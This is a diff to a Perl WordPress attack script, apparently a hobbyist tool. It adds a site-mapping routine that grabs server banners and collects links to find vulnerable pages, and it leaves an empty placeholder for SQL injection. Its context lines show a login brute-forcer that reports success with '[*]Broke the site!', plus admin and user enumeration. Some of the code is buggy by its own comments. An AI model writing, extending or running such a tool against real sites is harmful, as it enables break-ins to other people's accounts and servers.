@@ -6,6 +6,11 @@
 #
 ########
 
+################Version 1.1###################
+#
+# Added support for reading user provided lists
+#
+
 ################Version 1.0###################
 #
 # Currently works with basic information gathering and basic brute forcing
@@ -35,6 +40,7 @@ system('clear');
 #Static Variables
 my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
 my @oports;
+my @content;
 my $sock;
 my $banner = << 'EOL';
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -45,7 +51,7 @@ my $banner = << 'EOL';
 |___|__|_|  /  |__| |___|  /\___  > \________|____/\___  /\___  / \___  >__|  |___|  (____  /____/ |__|    |______  /___| |____|    \______  /\___|_  /
           \/             \/     \/                /_____//_____/      \/           \/     \/                      \/                       \/       \/
 
-VERSION 1.0
+VERSION 1.1
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 EOL
 #####################################
@@ -84,6 +90,7 @@ port_scanner();
 admin_find();
 version_find();
 user_find();
+site_map();
 #####################################
 #Start subroutine building
 ####
@@ -210,7 +217,7 @@ sub brute_force {
         my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth]; #builds a POST request for the login page
         my $attempt = $bot->request($login); #sends the actual request
         my $status = $attempt-> as_string; #Converts the data from the HASH that the request sends to a STRING
-      if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
+        if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){ #checks if the redirect has occurred
           print color('bold green');
           print "[*]Broke the site!\n";
           print "[*] =>\t$victim \n";
@@ -221,6 +228,70 @@ sub brute_force {
   }
 
 ####
+#Site mapping
+#Will work with the SQL Injection... eventually
+sub site_map{
+  print color('bold yellow');
+  print "++++++++++++++++++++++++++++++++++\n";
+  print "[*]Looking for pages with potential vulns\n";
+  print "++++++++++++++++++++++++++++++++++\n";
+  print color('reset');
+  my $buffer; #variable used to temporarily store socket requests
+  my @get; #array for pages that have GET parameters
+  my $server = 0; #Used for testing the server type
+  $sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => '80' ,Proto => 'tcp', Timeout => 1);
+
+  #Sending a request to the server
+  #Has to be adjusted, causes an error: "Can't call method "send" on an undefined value"
+  $sock->send("HEAD / HTTP/1.1\r\n");
+  $sock->send("\r\n");
+  $sock->send("\r\n");
+  $sock->recv($buffer, 2048);
+
+
+  my @buffer = split("\n",$buffer); #split the data in the $buffer variable by newline characters and saves it to an array
+
+  foreach (@buffer){
+    if(m/^Server:(.*)/i){
+      print "Web server is: $1 \n";
+      $server++
+    }
+  }
+  if($server) {
+    foreach ("html", "htm", "php", "asp", "aspx", "txt") {
+      if(page("index"."$_")){
+        print "page: index $_ \n";
+        foreach (@content){
+          print "File: $2 \n" if(m/<a.*href=("|")([^"']+)("|')/);
+        }
+        last;
+      }
+    }
+  }
+  #Nested function
+  sub page {
+    my $res = $bot -> get($host.":80"."/".$_[0]);
+    if ($res -> is_success){
+      @content = split(/\015?\012/,$res->content); #\015 = ^M \012 = ^J
+      return $_[0];
+    }
+    return;
+  }
+  END {
+    $sock->close() if $sock;
+  }
+}
+
+
+
+
+
+
+####
+#SQL Injection
+sub sql{}
+
+####
 #FTP brute forcing
 sub ftp_brute {
   print color('bold yellow');
@@ -228,9 +299,6 @@ sub ftp_brute {
   print "[*]Trying to break the FTP login\n";
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
-
-
-
 
 }
 
